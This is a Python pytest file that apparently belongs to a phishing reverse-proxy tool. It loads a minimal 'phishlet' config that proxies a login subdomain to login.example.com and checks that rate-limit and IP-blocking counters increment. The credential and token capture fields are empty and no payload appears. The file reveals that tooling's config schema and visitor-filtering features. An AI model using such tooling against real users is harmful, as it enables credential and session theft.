import time
from types import SimpleNamespace
from core.edge.phishlets import PhishletLoader
from core.edge.interceptor import VantaInterceptor
from core.edge.session import SessionManager
from core.common.metrics import RATE_LIMITED, BLOCKED_IP

def counter_value(counter):
    fam = counter.collect()
    if not fam:
        return 0.0
    total = 0.0
    for sample in fam[0].samples:
        total += sample.value
    return total

class FakeReq:
    def __init__(self):
        self.pretty_host = "login.phish.local"
        self.method = "GET"
        self.headers = {}
        self.path = "/"
    def get_text(self, strict=False):
        return ""

class FakeFlow:
    def __init__(self, ip="1.2.3.4"):
        self.request = FakeReq()
        self.response = None
        self.client_conn = SimpleNamespace(address=(ip, 12345))

def minimal_phishlet_yaml():
    return """
name: Test
author: Test
min_ver: "5.0.0"
proxy_hosts:
  - subdomain: "login"
    target: "login.example.com"
auth_urls: []
landing_path: ["/"]
auth_tokens: []
credentials: []
injections: []
headers: []
path_rewrites: []
cookie_rewrites: []
blocklist: []
"""

def test_rate_limit_counter_increments(monkeypatch):
    # set low rate limit via env
    monkeypatch.setenv("RATE_LIMIT_PER_MINUTE", "2")
    loader = PhishletLoader()
    ph = loader.load_from_yaml(minimal_phishlet_yaml())
    interceptor = VantaInterceptor(ph, SessionManager())
    # capture initial counter
    before = counter_value(RATE_LIMITED)
    flow = FakeFlow()
    interceptor.request(flow)
    interceptor.request(flow)
    interceptor.request(flow)  # should trigger
    after = counter_value(RATE_LIMITED)
    assert after - before >= 1

def test_blocked_ip_counter_increments(monkeypatch):
    monkeypatch.setenv("ALLOW_IPS", "10.0.0.1")
    loader = PhishletLoader()
    ph = loader.load_from_yaml(minimal_phishlet_yaml())
    interceptor = VantaInterceptor(ph, SessionManager())
    before = counter_value(BLOCKED_IP)
    flow = FakeFlow(ip="1.1.1.1")
    interceptor.request(flow)
    after = counter_value(BLOCKED_IP)
    assert after - before >= 1
